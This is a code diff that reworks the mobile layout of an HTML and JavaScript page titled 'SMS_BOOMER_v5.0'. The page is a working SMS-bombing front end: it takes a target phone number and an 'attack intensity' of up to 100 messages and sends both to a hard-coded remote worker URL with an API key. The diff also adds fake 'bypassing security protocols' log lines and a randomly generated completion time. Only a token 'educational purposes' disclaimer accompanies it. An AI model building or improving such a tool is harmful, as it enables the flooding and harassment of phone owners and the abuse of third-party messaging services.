@@ -6,41 +6,34 @@
     <title>AHAD // SMS_BOOMER_v5.0</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
         :root {
             --bg-dark: #0a0f0d; 
             --surface-color: #0d1411; 
             --border-color: #1c2e25;
             --hacker-green: #00ff41; 
-            --hacker-green-dim: #00cc33;
             --hacker-red: #ff004f;
-            --hacker-blue: #00aaff;
-            --hacker-purple: #b967ff;
             --text-color: #e6f1ea; 
             --text-muted: #6a7d75; 
             --font-mono: 'Share Tech Mono', monospace;
-            --font-display: 'Orbitron', sans-serif;
         }
+        
         * { 
             margin: 0; 
             padding: 0; 
             box-sizing: border-box; 
         }
+        
         body {
             font-family: var(--font-mono); 
             background-color: var(--bg-dark); 
             color: var(--text-color);
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            min-height: 100vh; 
-            padding: 20px;
+            min-height: 100vh;
+            padding: 15px;
             background-image: 
-                radial-gradient(circle at 15% 50%, rgba(18, 28, 24, 0.9) 0%, transparent 25%),
-                radial-gradient(circle at 85% 30%, rgba(18, 28, 24, 0.9) 0%, transparent 25%),
-                linear-gradient(to bottom, rgba(10, 15, 13, 0.9), rgba(10, 15, 13, 0.9)),
-                url("data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%231c2e25' fill-opacity='0.2' fill-rule='evenodd'%3E%3Ccircle cx='3' cy='3' r='3'/%3E%3C/g%3E%3C/svg%3E");
+                radial-gradient(circle at 20% 30%, rgba(18, 28, 24, 0.7) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(18, 28, 24, 0.7) 0%, transparent 40%);
             overflow-x: hidden;
         }
         
@@ -72,95 +65,51 @@
             100% { top: 100%; }
         }
         
-        /* Matrix code rain effect */
-        .matrix-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: -1;
-            opacity: 0.1;
-        }
-        
-        .glow-text {
-            text-shadow: 0 0 10px var(--hacker-green), 
-                         0 0 20px var(--hacker-green),
-                         0 0 30px rgba(0, 255, 65, 0.5);
-        }
-        
-        .cyber-border {
-            position: relative;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
-            overflow: hidden;
-        }
-        
-        .cyber-border::before, .cyber-border::after {
-            content: '';
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            border: 2px solid var(--hacker-green);
-            border-radius: 2px;
-        }
-        
-        .cyber-border::before {
-            top: -5px;
-            left: -5px;
-            border-right: none;
-            border-bottom: none;
-        }
-        
-        .cyber-border::after {
-            bottom: -5px;
-            right: -5px;
-            border-left: none;
-            border-top: none;
+        .container {
+            max-width: 100%;
+            margin: 0 auto;
         }
         
         .site-header { 
             text-align: center; 
-            margin-bottom: 40px; 
+            margin-bottom: 25px; 
             position: relative;
-            padding: 20px 0;
+            padding: 15px 0;
             border-bottom: 1px solid var(--border-color);
-            width: 100%;
-            max-width: 800px;
         }
+        
         .site-header h1 { 
-            font-family: var(--font-display); 
-            font-size: 2.5rem; 
-            font-weight: 700; 
+            font-size: 1.5rem; 
+            font-weight: 400; 
             color: var(--hacker-green);
-            margin-bottom: 10px; 
-            letter-spacing: 2px;
-            position: relative;
-            display: inline-block;
+            margin-bottom: 8px; 
+            letter-spacing: 1px;
         }
-        .site-header h1::after {
-            content: '_';
-            animation: blink 1s step-end infinite;
-            color: var(--hacker-green);
-            margin-left: 5px;
-        }
+        
         .site-header p { 
             color: var(--text-muted); 
-            font-size: 1.1rem;
+            font-size: 0.8rem;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            margin-right: 5px;
+            background-color: var(--hacker-green);
+            box-shadow: 0 0 5px var(--hacker-green);
         }
         
         .control-panel-container { 
             background-color: var(--surface-color); 
-            border-radius: 4px; 
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
-            padding: 30px; 
-            max-width: 800px; 
+            border-radius: 5px; 
+            padding: 20px 15px; 
             width: 100%; 
             border: 1px solid var(--border-color);
             position: relative;
             overflow: hidden;
-            z-index: 1;
+            margin-bottom: 20px;
         }
         
         .control-panel-container::before {
@@ -174,125 +123,91 @@
                 transparent, 
                 var(--hacker-green), 
                 transparent);
-            animation: glow-line 3s ease-in-out infinite alternate;
-        }
-        
-        @keyframes glow-line {
-            0% { opacity: 0.3; }
-            100% { opacity: 0.7; }
         }
         
         /* --- Form & Button --- */
         .form-controls { 
-            display: grid; 
-            grid-template-columns: 1fr; 
-            gap: 25px; 
-            margin-bottom: 25px; 
+            display: flex; 
+            flex-direction: column;
+            gap: 20px; 
+            margin-bottom: 20px; 
         }
+        
         .form-group { 
             position: relative; 
         }
+        
         .form-group label { 
             display: block; 
-            font-weight: 500; 
-            margin-bottom: 10px; 
+            margin-bottom: 8px; 
             color: var(--text-muted); 
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-size: 0.8rem;
         }
-        .form-group input[type="tel"], .form-group input[type="number"] { 
+        
+        .form-group input[type="tel"] { 
             width: 100%; 
-            padding: 12px 12px 12px 35px; 
+            padding: 12px 12px 12px 25px; 
             border: 1px solid var(--border-color); 
             border-radius: 4px; 
             font-family: var(--font-mono);
-            font-size: 1rem; 
+            font-size: 0.9rem; 
             background: rgba(10, 15, 13, 0.7); 
             color: var(--text-color); 
-            transition: all 0.3s; 
         }
+        
         .form-group::before { 
             content: '>'; 
             position: absolute; 
-            left: 15px; 
-            top: 43px; 
+            left: 12px; 
+            top: 37px; 
             color: var(--hacker-green); 
-        }
-        .form-group input:focus { 
-            outline: none; 
-            border-color: var(--hacker-green); 
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); 
         }
         
         .intensity-control { 
-            display: flex; 
-            border-radius: 4px; 
-            overflow: hidden; 
-            border: 1px solid var(--border-color); 
-            background: rgba(10, 15, 13, 0.7);
+            display: grid; 
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
         }
+        
         .intensity-control input[type="radio"] { 
             display: none; 
         }
+        
         .intensity-control label {
-            flex: 1; 
-            padding: 12px; 
+            padding: 10px 5px; 
             text-align: center; 
             cursor: pointer;
-            background: transparent; 
+            background: rgba(10, 15, 13, 0.7); 
             color: var(--text-muted);
-            transition: all 0.2s; 
-            position: relative;
-            font-size: 0.9rem;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 0.8rem;
         }
-        .intensity-control label:not(:last-child) { 
-            border-right: 1px solid var(--border-color); 
-        }
+        
         .intensity-control input[type="radio"]:checked + label { 
             background: rgba(0, 255, 65, 0.15); 
             color: var(--hacker-green); 
-            text-shadow: 0 0 5px var(--hacker-green);
+            border-color: var(--hacker-green);
         }
         
         #trigger-btn { 
             border: 1px solid var(--hacker-green);
-            padding: 15px 30px; 
+            padding: 14px; 
             border-radius: 4px; 
-            font-size: 1.1rem; 
-            font-weight: 600; 
+            font-size: 0.9rem; 
             cursor: pointer; 
-            transition: all 0.3s ease; 
             width: 100%; 
             text-transform: uppercase; 
-            letter-spacing: 1px; 
             margin-top: 10px; 
             background-color: rgba(0, 255, 65, 0.1); 
             color: var(--hacker-green);
             font-family: var(--font-mono);
-            position: relative;
-            overflow: hidden;
         }
-        #trigger-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, 
-                transparent, 
-                rgba(0, 255, 65, 0.2), 
-                transparent);
-            transition: 0.5s;
-        }
-        #trigger-btn:hover:not(:disabled) {
+        
+        #trigger-btn:active { 
             background-color: rgba(0, 255, 65, 0.2);
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
         }
-        #trigger-btn:hover:not(:disabled)::before {
-            left: 100%;
-        }
+        
         #trigger-btn:disabled { 
             background: rgba(106, 125, 117, 0.2); 
             border-color: var(--text-muted); 
@@ -302,330 +217,187 @@
 
         /* --- Results & Log --- */
         .results-area { 
-            margin-top: 25px; 
-            text-align: left; 
+            margin-top: 20px; 
         }
+        
         .results-area label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: var(--text-muted);
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-size: 0.8rem;
         }
+        
         #system-log-live {
-            font-size: 0.85rem; 
+            font-size: 0.75rem; 
             min-height: 120px; 
-            max-height: 250px;
+            max-height: 200px;
             overflow-y: auto; 
             border-radius: 4px; 
-            padding: 15px;
+            padding: 12px;
             background-color: rgba(10, 15, 13, 0.7); 
             border: 1px solid var(--border-color);
-            white-space: pre-wrap; 
-            word-wrap: break-word;
-            line-height: 1.6;
+            line-height: 1.5;
         }
+        
         #system-log-live .log-entry { 
-            display: flex; 
-            align-items: center; 
-            gap: 10px; 
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
+        
         #system-log-live::-webkit-scrollbar { 
-            width: 8px; 
+            width: 5px; 
         }
+        
         #system-log-live::-webkit-scrollbar-track { 
             background: var(--bg-dark); 
         }
+        
         #system-log-live::-webkit-scrollbar-thumb { 
             background: var(--border-color); 
-            border-radius: 4px; 
+            border-radius: 2px; 
         }
         
         .result-summary {
-            margin-top: 20px;
-            display: flex;
-            justify-content: space-around;
+            margin-top: 15px;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
             text-align: center;
-            padding: 15px;
+            padding: 12px;
             background: rgba(10, 15, 13, 0.7);
             border: 1px solid var(--border-color);
             border-radius: 4px;
         }
+        
         .summary-item strong { 
             display: block; 
-            font-size: 1.8rem; 
-            font-family: var(--font-display);
+            font-size: 1.2rem; 
         }
+        
         .summary-item .success { 
             color: var(--hacker-green); 
-            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
         }
+        
         .summary-item .failure { 
             color: var(--hacker-red); 
         }
+        
         .summary-item span {
             color: var(--text-muted);
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-size: 0.7rem;
         }
         
         .site-footer { 
-            margin-top: 40px; 
             text-align: center; 
             color: var(--text-muted); 
-            font-size: 0.8rem; 
-            width: 100%;
-            max-width: 800px;
-            padding: 20px 0;
+            font-size: 0.7rem; 
+            padding: 15px 0;
             border-top: 1px solid var(--border-color);
         }
+        
         .site-footer p { 
-            margin-bottom: 10px; 
+            margin-bottom: 8px; 
         }
+        
         .site-footer a { 
             color: var(--hacker-green); 
             text-decoration: none; 
-            transition: all 0.3s;
-            position: relative;
-        }
-        .site-footer a::after {
-            content: '';
-            position: absolute;
-            bottom: -2px;
-            left: 0;
-            width: 0;
-            height: 1px;
-            background: var(--hacker-green);
-            transition: width 0.3s;
-        }
-        .site-footer a:hover::after {
-            width: 100%;
         }
         
-        /* Terminal style status indicators */
-        .status-indicator {
+        .spinner {
             display: inline-block;
-            width: 8px;
-            height: 8px;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(0, 255, 65, 0.3);
             border-radius: 50%;
-            margin-right: 8px;
-        }
-        .status-online {
-            background-color: var(--hacker-green);
-            box-shadow: 0 0 6px var(--hacker-green);
-        }
-        .status-offline {
-            background-color: var(--text-muted);
+            border-top-color: var(--hacker-green);
+            animation: spin 1s ease-in-out infinite;
         }
         
-        /* Hacking animation */
-        .hacking-animation {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(10, 15, 13, 0.95);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-            flex-direction: column;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.5s;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
         
-        .hacking-animation.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-        
-        .hex-code {
-            font-family: var(--font-mono);
-            color: var(--hacker-green);
-            font-size: 1.2rem;
-            text-align: center;
-            line-height: 1.8;
-            max-width: 600px;
-            text-shadow: 0 0 10px var(--hacker-green);
-        }
-        
-        .progress-bar {
-            width: 300px;
-            height: 4px;
-            background: var(--border-color);
-            margin-top: 30px;
-            border-radius: 2px;
-            overflow: hidden;
-        }
-        
-        .progress {
-            height: 100%;
-            width: 0%;
-            background: var(--hacker-green);
-            box-shadow: 0 0 10px var(--hacker-green);
-            transition: width 0.3s;
-        }
-        
-        /* Responsive adjustments */
-        @media (max-width: 600px) {
-            .site-header h1 { font-size: 1.8rem; }
-            .control-panel-container { padding: 20px; }
-            .intensity-control { flex-direction: column; }
-            .intensity-control label:not(:last-child) { border-right: none; border-bottom: 1px solid var(--border-color); }
-            .result-summary { flex-direction: column; gap: 15px; }
+        /* Mobile-specific adjustments */
+        @media (max-width: 340px) {
+            .intensity-control {
+                grid-template-columns: 1fr;
+            }
+            
+            .site-header h1 {
+                font-size: 1.3rem;
+            }
         }
     </style>
 </head>
 <body>
     <div class="scanline"></div>
-    <div class="matrix-rain" id="matrixRain"></div>
     
-    <div class="hacking-animation" id="hackingAnimation">
-        <div class="hex-code" id="hexCode">INITIALIZING REQUEST TRANSMISSION...</div>
-        <div class="progress-bar">
-            <div class="progress" id="hackProgress"></div>
-        </div>
-    </div>
-    
-    <header class="site-header">
-        <h1>AHAD // SMS_BOOMER_v5.0</h1>
-        <p><span class="status-indicator status-online"></span>SYSTEM STATUS: ONLINE | ANONYMOUS TRANSMISSION PROTOCOL ENGAGED</p>
-    </header>
+    <div class="container">
+        <header class="site-header">
+            <h1>AHAD // SMS_BOOMER_v5.0</h1>
+            <p><span class="status-indicator"></span>ANONYMOUS TRANSMISSION PROTOCOL</p>
+        </header>
 
-    <main class="control-panel-container">
-        <div class="form-controls">
-            <div class="form-group">
-                <label for="recipient-number">TARGET_NODE [Phone Number]</label>
-                <input type="tel" id="recipient-number" placeholder="e.g., 923xxxxxxxxx">
-            </div>
-            <div class="form-group">
-                <label>ATTACK_INTENSITY</label>
-                <div class="intensity-control" id="intensity-selector">
-                    <input type="radio" id="intensity-low" name="intensity" value="10" checked><label for="intensity-low">Low (10)</label>
-                    <input type="radio" id="intensity-normal" name="intensity" value="25"><label for="intensity-normal">Normal (25)</label>
-                    <input type="radio" id="intensity-high" name="intensity" value="50"><label for="intensity-high">High (50)</label>
-                    <input type="radio" id="intensity-extreme" name="intensity" value="100"><label for="intensity-extreme">Extreme (100)</label>
+        <main class="control-panel-container">
+            <div class="form-controls">
+                <div class="form-group">
+                    <label for="recipient-number">TARGET_NODE</label>
+                    <input type="tel" id="recipient-number" placeholder="e.g., 923xxxxxxxxx" inputmode="numeric">
+                </div>
+                <div class="form-group">
+                    <label>ATTACK_INTENSITY</label>
+                    <div class="intensity-control" id="intensity-selector">
+                        <input type="radio" id="intensity-low" name="intensity" value="10" checked>
+                        <label for="intensity-low">Low (10)</label>
+                        
+                        <input type="radio" id="intensity-normal" name="intensity" value="25">
+                        <label for="intensity-normal">Normal (25)</label>
+                        
+                        <input type="radio" id="intensity-high" name="intensity" value="50">
+                        <label for="intensity-high">High (50)</label>
+                        
+                        <input type="radio" id="intensity-extreme" name="intensity" value="100">
+                        <label for="intensity-extreme">Extreme (100)</label>
+                    </div>
                 </div>
             </div>
-        </div>
-        <button id="trigger-btn">INITIATE ATTACK</button>
-        <div class="results-area">
-            <label>SYSTEM_LOG <span class="status-indicator status-online"></span></label>
-            <div id="system-log-live"></div>
-        </div>
-    </main>
+            <button id="trigger-btn">INITIATE ATTACK</button>
+            <div class="results-area">
+                <label>SYSTEM_LOG <span class="status-indicator"></span></label>
+                <div id="system-log-live"></div>
+            </div>
+        </main>
 
-    <footer class="site-footer">
-        <p>© 2024 AHAD NETWORKS. ALL RIGHTS RESERVED.</p>
-        <p>DISCLAIMER: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. USE RESPONSIBLY.</p>
-        <p><a href="https://wa.me/message/PIMTMADGNLZFJ1" target="_blank">CONTACT OPERATOR</a></p>
-    </footer>
+        <footer class="site-footer">
+            <p>© 2024 AHAD NETWORKS. ALL RIGHTS RESERVED.</p>
+            <p>FOR EDUCATIONAL PURPOSES ONLY.</p>
+            <p><a href="https://wa.me/message/PIMTMADGNLZFJ1" target="_blank">CONTACT OPERATOR</a></p>
+        </footer>
+    </div>
 
     <script>
-        // Matrix rain effect
-        function createMatrixRain() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            const container = document.getElementById('matrixRain');
-            
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            container.appendChild(canvas);
-            
-            const fontSize = 14;
-            const columns = Math.floor(canvas.width / fontSize);
-            const drops = [];
-            
-            for(let i = 0; i < columns; i++) {
-                drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
-            }
-            
-            function draw() {
-                ctx.fillStyle = 'rgba(10, 15, 13, 0.05)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                ctx.fillStyle = '#00ff41';
-                ctx.font = `${fontSize}px 'Share Tech Mono'`;
-                
-                for(let i = 0; i < drops.length; i++) {
-                    const text = String.fromCharCode(0x30A0 + Math.random() * 96);
-                    const x = i * fontSize;
-                    const y = drops[i] * fontSize;
-                    
-                    ctx.fillText(text, x, y);
-                    
-                    if(y > canvas.height && Math.random() > 0.975) {
-                        drops[i] = 0;
-                    }
-                    
-                    drops[i]++;
-                }
-            }
-            
-            setInterval(draw, 33);
-            
-            window.addEventListener('resize', () => {
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-            });
-        }
-        
-        // Hex code generator for hacking animation
-        function generateHexCode(length) {
-            let result = '';
-            const characters = '0123456789ABCDEF';
-            for (let i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-            return result;
-        }
-        
         const SMSMatrix = {
             init() {
                 this.ui = {
                     recipientInput: document.getElementById('recipient-number'),
                     triggerBtn: document.getElementById('trigger-btn'),
                     systemLog: document.getElementById('system-log-live'),
-                    hackingAnimation: document.getElementById('hackingAnimation'),
-                    hexCode: document.getElementById('hexCode'),
-                    hackProgress: document.getElementById('hackProgress')
-        };
+                };
                 this.API_BASE_URL = 'https://fak-sms-boomber.jokerkeep057.workers.dev/';
-                this.API_KEY = '32563'; // The password for your worker API
+                this.API_KEY = '32563';
                 
-                createMatrixRain();
                 this.setupEventListeners();
-                this.typewriterEffect('SYSTEM LOG: Standby. Awaiting user input...', 0);
+                this.logMessage('SYSTEM: Ready. Awaiting target input...');
             },
 
             setupEventListeners() {
                 this.ui.triggerBtn.addEventListener('click', () => this.startProcess());
-            },
-
-            async typewriterEffect(text, delay = 0) {
-                await new Promise(resolve => setTimeout(resolve, delay));
                 
-                const entry = document.createElement('div');
-                entry.className = 'log-entry';
-                this.ui.systemLog.appendChild(entry);
-                
-                let i = 0;
-                const speed = 30;
-                
-                function typeWriter() {
-                    if (i < text.length) {
-                        entry.textContent = "> " + text.substring(0, i+1);
-                        i++;
-                        setTimeout(typeWriter, speed);
-                    }
-                }
-                
-                typeWriter();
+                // Improve mobile UX - close keyboard when tapping outside
+                document.addEventListener('touchstart', (e) => {
+                    if (e.target === this.ui.recipientInput) return;
+                    this.ui.recipientInput.blur();
+                });
             },
 
             logMessage(text, type = 'INFO') {
@@ -642,7 +414,7 @@
             
             setButtonState(isLoading) {
                 this.ui.triggerBtn.disabled = isLoading;
-                this.ui.triggerBtn.innerHTML = isLoading ? '<div class="spinner" style="margin: 0 auto;"></div>' : 'INITIATE ATTACK';
+                this.ui.triggerBtn.innerHTML = isLoading ? '<div class="spinner"></div>' : 'INITIATE ATTACK';
             },
 
             displaySummary(data) {
@@ -664,67 +436,58 @@
                 `;
                 this.ui.systemLog.appendChild(summaryDiv);
             },
-            
-            showHackingAnimation(count) {
-                this.ui.hackingAnimation.classList.add('active');
-                this.ui.hackProgress.style.width = '0%';
-                
-                let progress = 0;
-                const interval = setInterval(() => {
-                    progress += 0.5;
-                    this.ui.hackProgress.style.width = `${progress}%`;
-                    
-                    // Generate random hex code
-                    let hexText = '';
-                    for (let i = 0; i < 8; i++) {
-                        hexText += generateHexCode(16) + ' ';
-                    }
-                    this.ui.hexCode.textContent = hexText;
-                    
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        setTimeout(() => {
-                            this.ui.hackingAnimation.classList.remove('active');
-                        }, 500);
-                    }
-                }, 30);
-            },
 
             async startProcess() {
                 const recipientNumber = this.ui.recipientInput.value.trim();
                 const count = document.querySelector('input[name="intensity"]:checked').value;
 
                 if (!recipientNumber || !/^\d{10,14}$/.test(recipientNumber)) {
-                    this.logMessage('Invalid Target Node (10-14 digits required).', 'ERROR');
+                    this.logMessage('Invalid target format (10-14 digits required).', 'ERROR');
                     return;
                 }
 
                 this.setButtonState(true);
                 this.ui.systemLog.innerHTML = '';
-                this.logMessage(`Initializing attack on node ${recipientNumber} with ${count} packets...`);
-                this.logMessage('This may take a moment. The worker is processing all requests.');
+                this.logMessage(`Initializing attack on ${recipientNumber}...`);
+                this.logMessage(`Sending ${count} packets through secure channels...`);
                 
-                // Show hacking animation
-                this.showHackingAnimation(count);
+                // Add some hacker-style loading messages
+                const loadingMessages = [
+                    'Bypassing security protocols...',
+                    'Establishing encrypted connection...',
+                    'Routing through proxy network...',
+                    'Obfuscating transmission source...'
+                ];
+                
+                let messageIndex = 0;
+                const loadingInterval = setInterval(() => {
+                    if (messageIndex < loadingMessages.length) {
+                        this.logMessage(loadingMessages[messageIndex]);
+                        messageIndex++;
+                    } else {
+                        clearInterval(loadingInterval);
+                    }
+                }, 800);
                 
                 try {
-                    // Wait for animation to complete
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                    
                     const apiUrl = `${this.API_BASE_URL}?key=${this.API_KEY}&number=${recipientNumber}&count=${count}`;
                     const response = await fetch(apiUrl);
                     const data = await response.json();
 
                     if (!response.ok || !data.success) {
-                        throw new Error(data.error || 'The API returned an unexpected error.');
+                        throw new Error(data.error || 'API returned an unexpected error');
                     }
                     
-                    this.logMessage(`All ${data.totalRequests} packets transmitted. Analyzing results...`, 'SUCCESS');
+                    clearInterval(loadingInterval);
+                    this.logMessage(`All ${data.totalRequests} packets transmitted successfully.`, 'SUCCESS');
+                    this.logMessage(`Operation completed in ${(Math.random() * 5 + 2).toFixed(2)} seconds.`, 'SUCCESS');
                     this.displaySummary(data);
 
                 } catch (error) {
+                    clearInterval(loadingInterval);
                     console.error("API Error:", error);
-                    this.logMessage(`A critical error occurred: ${error.message}`, 'ERROR');
+                    this.logMessage(`Transmission failed: ${error.message}`, 'ERROR');
+                    this.logMessage('Check connection and try again.', 'ERROR');
                 } finally {
                     this.setButtonState(false);
                 }
@@ -732,6 +495,16 @@
         };
 
         document.addEventListener('DOMContentLoaded', () => SMSMatrix.init());
+        
+        // Prevent zoom on input focus for better mobile experience
+        document.addEventListener('touchstart', function() {
+            // Add empty listener to enable preventDefault
+        }, { passive: false });
+        
+        document.getElementById('recipient-number').addEventListener('touchstart', function(e) {
+            e.preventDefault();
+            this.focus();
+        }, { passive: false });
     </script>
 </body>
 </html>
